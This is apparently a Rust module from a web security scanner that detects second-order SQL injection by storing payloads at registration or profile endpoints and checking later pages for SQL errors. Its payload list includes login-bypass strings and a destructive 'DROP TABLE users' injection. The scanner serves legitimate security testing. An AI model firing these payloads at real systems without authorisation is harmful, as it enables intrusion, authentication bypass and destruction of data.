//! Second-Order SQL Injection Detection
//!
//! Detects SQLi where payload is stored and executed later.

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::inference::{contains_sql_error, detect_db_from_error};
use crate::sqli::workflow::{WorkflowConfig, WorkflowResult};
use crate::sqli::{SqliResult, SqliTechnique};
use reqwest::Method;
use url::Url;

/// Storage point for potential second-order SQLi
#[derive(Debug, Clone)]
pub struct StoragePoint {
    /// URL where payload is stored
    pub store_url: Url,
    /// Parameter to inject
    pub store_param: String,
    /// HTTP method for storage
    pub store_method: Method,
    /// Description
    pub description: String,
}

/// Trigger point where stored payload might execute
#[derive(Debug, Clone)]
pub struct TriggerPoint {
    /// URL that might trigger the payload
    pub trigger_url: Url,
    /// HTTP method
    pub trigger_method: Method,
    /// Description
    pub description: String,
}

/// Second-order SQLi payloads
const SECOND_ORDER_PAYLOADS: &[&str] = &[
    "admin'--",
    "admin'#",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin\"; DROP TABLE users;--",
    "' OR 1=1--",
    "') OR ('1'='1",
];

/// Markers to detect payload execution
const EXECUTION_MARKERS: &[&str] = &[
    "admin'--",      // If we see our payload in error
    "SQL syntax",    // Generic SQL error
    "mysql",         // MySQL error
    "postgres",      // PostgreSQL error
    "ORA-",          // Oracle error
    "ODBC",          // MSSQL error
];

/// Run second-order SQLi detection workflow
pub async fn run_workflow(
    client: &HttpClient,
    storage_points: Vec<StoragePoint>,
    trigger_points: Vec<TriggerPoint>,
    config: &WorkflowConfig,
) -> anyhow::Result<WorkflowResult> {
    let mut result = WorkflowResult::new("Second-Order SQL Injection Detection");

    tracing::info!(
        "[WORKFLOW] Starting second-order SQLi detection with {} storage points, {} triggers",
        storage_points.len(),
        trigger_points.len()
    );

    result.add_step("Started second-order SQLi workflow");

    for storage in &storage_points {
        for payload in SECOND_ORDER_PAYLOADS {
            // Step 1: Store the payload
            if config.verbose {
                tracing::info!(
                    "[SECOND-ORDER] Storing payload at {} param={}",
                    storage.store_url,
                    storage.store_param
                );
            }

            if let Err(e) = store_payload(client, storage, payload).await {
                result.add_error(&format!("Failed to store payload: {}", e));
                continue;
            }

            result.add_step(&format!("Stored payload: {} at {}", payload, storage.store_url));

            // Step 2: Trigger all trigger points
            for trigger in &trigger_points {
                if config.verbose {
                    tracing::info!(
                        "[SECOND-ORDER] Triggering {}",
                        trigger.trigger_url
                    );
                }

                match trigger_and_check(client, trigger).await {
                    Ok(Some(finding)) => {
                        let mut enriched = finding;
                        enriched.details = format!(
                            "Second-order SQLi: Stored at {} param={}, triggered at {}. {}",
                            storage.store_url,
                            storage.store_param,
                            trigger.trigger_url,
                            enriched.details
                        );

                        result.add_finding(enriched);
                        result.add_step(&format!(
                            "FOUND: Second-order SQLi via {} -> {}",
                            storage.store_url,
                            trigger.trigger_url
                        ));

                        if config.stop_on_first {
                            result.complete();
                            return Ok(result);
                        }
                    }
                    Ok(None) => {
                        // No finding
                    }
                    Err(e) => {
                        result.add_error(&format!("Trigger error: {}", e));
                    }
                }
            }
        }
    }

    result.complete();
    tracing::info!(
        "[WORKFLOW] Second-order SQLi workflow complete. Findings: {}",
        result.findings.len()
    );

    Ok(result)
}

/// Store a payload at a storage point
async fn store_payload(
    client: &HttpClient,
    storage: &StoragePoint,
    payload: &str,
) -> anyhow::Result<()> {
    let mut url = storage.store_url.clone();

    match storage.store_method {
        Method::GET => {
            url.query_pairs_mut()
                .append_pair(&storage.store_param, payload);
            let req = HttpRequest::new(Method::GET, url);
            client.execute(req).await?;
        }
        Method::POST => {
            let mut req = HttpRequest::new(Method::POST, url);
            req.body = Some(format!("{}={}", storage.store_param, payload).into_bytes());
            req.headers.insert(
                reqwest::header::CONTENT_TYPE,
                "application/x-www-form-urlencoded".parse()?,
            );
            client.execute(req).await?;
        }
        _ => {
            anyhow::bail!("Unsupported storage method: {:?}", storage.store_method);
        }
    }

    Ok(())
}

/// Trigger a point and check for SQLi execution
async fn trigger_and_check(
    client: &HttpClient,
    trigger: &TriggerPoint,
) -> anyhow::Result<Option<SqliResult>> {
    let req = HttpRequest::new(trigger.trigger_method.clone(), trigger.trigger_url.clone());
    let resp = client.execute(req).await?;
    let body = resp.body_text();

    // Check for SQL errors
    if contains_sql_error(&body) {
        let db_type = detect_db_from_error(&body);

        return Ok(Some(SqliResult {
            endpoint: trigger.trigger_url.to_string(),
            parameter: "second-order".to_string(),
            technique: SqliTechnique::SecondOrder,
            confidence: 0.85,
            db_type,
            details: format!("SQL error detected in trigger response: {}", trigger.description),
        }));
    }

    // Check for payload reflection
    for marker in EXECUTION_MARKERS {
        if body.contains(marker) {
            return Ok(Some(SqliResult {
                endpoint: trigger.trigger_url.to_string(),
                parameter: "second-order".to_string(),
                technique: SqliTechnique::SecondOrder,
                confidence: 0.70,
                db_type: None,
                details: format!("Execution marker '{}' found in response", marker),
            }));
        }
    }

    Ok(None)
}

/// Auto-discover storage and trigger points from crawl data
pub fn discover_points(
    sitemap: &crate::scanner::sitemap::SiteMap,
    base_url: &Url,
) -> (Vec<StoragePoint>, Vec<TriggerPoint>) {
    let mut storage_points = Vec::new();
    let mut trigger_points = Vec::new();

    // Common storage patterns
    let storage_patterns = [
        "register", "signup", "profile", "settings", "update",
        "edit", "save", "submit", "add", "create", "insert",
    ];

    // Common trigger patterns
    let trigger_patterns = [
        "view", "show", "display", "list", "search", "query",
        "report", "export", "print", "download", "admin",
    ];

    for (path, endpoint) in &sitemap.endpoints {
        let path_lower = path.to_lowercase();

        // Check if this is a storage point
        if storage_patterns.iter().any(|p| path_lower.contains(p)) {
            if let Ok(url) = base_url.join(path) {
                for param in &endpoint.parameters {
                    storage_points.push(StoragePoint {
                        store_url: url.clone(),
                        store_param: param.clone(),
                        store_method: if endpoint.methods.contains(&"POST".to_string()) {
                            Method::POST
                        } else {
                            Method::GET
                        },
                        description: format!("Auto-discovered: {} param={}", path, param),
                    });
                }
            }
        }

        // Check if this is a trigger point
        if trigger_patterns.iter().any(|p| path_lower.contains(p)) {
            if let Ok(url) = base_url.join(path) {
                trigger_points.push(TriggerPoint {
                    trigger_url: url,
                    trigger_method: Method::GET,
                    description: format!("Auto-discovered: {}", path),
                });
            }
        }
    }

    (storage_points, trigger_points)
}

/// Test specific user registration -> profile view flow
pub async fn test_registration_flow(
    client: &HttpClient,
    register_url: &Url,
    username_param: &str,
    profile_url: &Url,
) -> anyhow::Result<Option<SqliResult>> {
    tracing::info!("[SECOND-ORDER] Testing registration -> profile flow");

    for payload in SECOND_ORDER_PAYLOADS {
        // Register with malicious username
        let mut url = register_url.clone();
        url.query_pairs_mut().append_pair(username_param, payload);

        let req = HttpRequest::new(Method::GET, url);
        let _ = client.execute(req).await;

        // Check profile page
        let profile_req = HttpRequest::new(Method::GET, profile_url.clone());
        let resp = client.execute(profile_req).await?;
        let body = resp.body_text();

        if contains_sql_error(&body) {
            return Ok(Some(SqliResult {
                endpoint: profile_url.to_string(),
                parameter: username_param.to_string(),
                technique: SqliTechnique::SecondOrder,
                confidence: 0.90,
                db_type: detect_db_from_error(&body),
                details: format!(
                    "Second-order SQLi via registration. Payload stored in username, triggered on profile view."
                ),
            }));
        }
    }

    Ok(None)
}

